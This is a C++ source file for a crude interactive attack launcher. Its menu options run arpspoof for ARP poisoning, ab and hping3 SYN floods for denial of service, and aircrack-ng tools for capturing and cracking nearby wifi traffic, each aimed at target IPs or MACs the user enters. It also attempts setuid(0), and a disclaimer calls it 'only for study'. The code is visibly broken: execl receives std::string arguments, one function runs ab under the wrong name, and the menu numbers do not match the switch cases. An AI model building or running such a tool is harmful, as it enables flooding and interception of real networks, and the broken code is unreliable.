#include<iostream>
#include<string>
#include<sys/wait.h>
#include<unistd.h>
using namespace std;
string device;
string find_program_path(const string& program_name) {
    string command = "which " + program_name;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to run command: " << command << endl;
        return "";
    }

    char buffer[128];
    string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);

    // 去除末尾换行符
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}
int verfy(){
     int chse;
     cout<<"this bash,was only for study,there is nobody will pay for accident.ALL YOUR FAULT,not mine.SO choose 1 to use the tool,choose 0 to exit."<<endl;
     cin>>chse;
     if(chse==1){
          return 0;
     }else{
          exit(0);
     }
}
int ifconfig(){
     string path;
     if(find_program_path("ifconfig").empty()){cout<<"ifconfig not found,please install it."<<endl;}
     else{
          path=find_program_path("ifconfig");
          const char *cstr = path.c_str();
     };
     int pid=fork();
     if(pid==0){
          execl(path.c_str(),"ifconfig",NULL);
          exit(0);
     }else if(pid>0){
          wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
     }
     return 0;
}
     int arpspoof(){
     string path;
     if(find_program_path("arpspoof").empty()){cout<<"arpspoof not found,please install it."<<endl;}
     else{
          path=find_program_path("arpspoof");
          const char *cstr = path.c_str();
     };
     int pid=fork();
     if(pid==0){
          string arg1;
          string arg2;
          cout<<"pls input target ip: ";
          cin>>arg1;
          cout<<"pls input gateway ip: ";
          cin>>arg2;
          cout<<"this command will run: arpspoof -t "<<arg1<<" -r "<<arg2<<endl;
          execl(path.c_str(),"arpspoof","-t",arg1.c_str(),"-r",arg2.c_str(),NULL);
          exit(0);
     }else if(pid>0){
          wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
     }
     return 0;
}
int cc_hack(){
     string path;
     if(find_program_path("arpspoof").empty()){cout<<"arpspoof not found,please install it."<<endl;}
     else{
          path=find_program_path("ab");
          const char *cstr = path.c_str();
     };
     int pid=fork();
     if(pid==0){
          string arg1;
          string arg2;
          string arg3;
          cout<<"pls input target ip: ";
          cin>>arg1;
          cout<<"pls input request times: ";
          cin>>arg2;
          cout<<"pls input request make at a time(max 20000): ";
          cin>>arg3;
          cout<<"this command will run: ab -n "<<arg2<<" -c "<<arg3<<" "<<arg1<<endl;
          execl(path.c_str(),"arpspoof","-n",arg2.c_str(),"-c",arg3.c_str(),arg1.c_str(),NULL);
          exit(0);
     }else if(pid>0){
          wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
     }
     return 0;
}
int dos(){
     string path;
     if(find_program_path("hping3").empty()){cout<<"hping3 not found,please install it."<<endl;}
     else{
          path=find_program_path("hping3");
          const char *cstr = path.c_str();
     };
     int pid=fork();
     if(pid==0){
          string arg1;
          cout<<"pls input target ip: ";
          cin>>arg1;
          cout<<"this command will run: hping3 -S --flood "<<arg1<<endl;
          execl(path.c_str(),"hping3","-S","--flood",arg1.c_str(),NULL);
          exit(0);
     }else if(pid>0){
          wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
     }
     return 0;
}
int fastfetch(){
     string path;
     if(find_program_path("fastfetch").empty()){cout<<"fastfetch not found,you need to install it."<<endl;}
     else{
     	 path=find_program_path("fastfetch");
	 const char *cstr = path.c_str();
     }
     int pid=fork();
     if(pid==0){
     	 execl(path.c_str(),"fastfetch",NULL);
	 exit(0);
     }else if(pid>0){
     	 wait(NULL);
	 cout<<"Press any key to continue..."<<endl;
	 getchar();
     }
     return 0;
}
int listen_target(){
     string path;
     string target_Mac;
     string target_channel_num;
     string pack_name;
     cout<<"enter your target Mac: ";
     cin>>target_Mac;
     cout<<"enter your target channel number: ";
     cin>>target_channel_num;
     cout<<"enter your pack name: ";
     cin>>pack_name;
     if(find_program_path("aircrack-ng").empty()){cout<<"aircrack-ng not found,you need to install it."<<endl;}
     else{
     	 path=find_program_path("airodump-ng");
	 const char *cstr = path.c_str();
     }
     int pid=fork();
     if(pid==0){
     	 execl(path.c_str(),"airodump-ng","-c",target_channel_num,"-w",pack_name,"--bssid",target_Mac,device,NULL);
	 exit(0);
     }else if(pid>0){
     	wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
	 getchar();
     }
     return 0;
}
int find_target(){
     string path;
     if(find_program_path("aircrack-ng").empty()){cout<<"aircrack-ng not found,you need to install it."<<endl;}
     else{
     	 path=find_program_path("airmon-ng");
	 const char *cstr = path.c_str();
     }
     int pid=fork();
     if(pid==0){
          cout<<"pls input your device: ";
          cin>>device;
     	execl(path.c_str(),"airmon-ng","start",device,NULL);
	 exit(0);
     }else if(pid>0){
     	wait(NULL);
          cout<<"Press any key to continue..."<<endl;
          getchar();
	 getchar();
     }
     return 0;
}
void cpd(){
     string path;
     if(find_program_path("aircrack-ng").empty()){cout<<"aircrack-ng kit not found,you need to install it."<<endl;}
     else{
     	 path=find_program_path("aircrack-ng");
	 const char *cstr = path.c_str();
     }
     int pid=fork();
     if(pid==0){
//last stop to there:
     	 execl(path.c_str(),"aircrack-ng","",NULL);
	 exit(0);
     }else if(pid>0){
     	 wait(NULL);
	 cout<<"Press any key to continue..."<<endl;
	 getchar();
     }
}
int main(){
     verfy();
     int choose;
     int userid = getuid();
     setuid(0);
     if(getuid()==0){
          cout<<"you are root,be careful."<<endl;
     }else{
          cout<<"root failed,some things may be wrong."<<endl;
     }
     end:
     cout<<"1)choose to ifconfig"<<endl;
     cout<<"2)choose to arpspoof"<<endl;
     cout<<"3)choose to cc f*cked"<<endl;
     cout<<"4)choose to dos <just hping3 SYN flood>"<<endl;
     cout<<"5)choose to fastfetch"<<endl;
     cout<<"6)choose to collect pack from nearby with aircrack-ng"<<endl;
     cout<<"7)choose to find target from nearby"<<endl;
     cout<<"8)choose to collect pack from a device"<<endl;
     cout<<"9)choose crack the pack with aircrack-ng"<<endl;
     cin>>choose;
     switch(choose){ 
          case 1:
               ifconfig();
               getchar();
               goto end;
               break;
          case 2:
               arpspoof();
               getchar();
               goto end;
               break;
          case 3:
               cc_hack();
               getchar();
               goto end;
               break;
          case 4:
               dos();
               getchar();
               goto end;
               break;
          case 5:
               fastfetch();
               getchar();
               goto end;
               break;
          case 6:
               find_target();
               getchar();
               goto end;
               break;
          case 7:
          	cpd();
          	getchar();
	          goto end;
	          break;
          default:
               cout<<"you need give a choose."<<endl;
               getchar();
               goto end;
               break;
     }
     return 0;
}
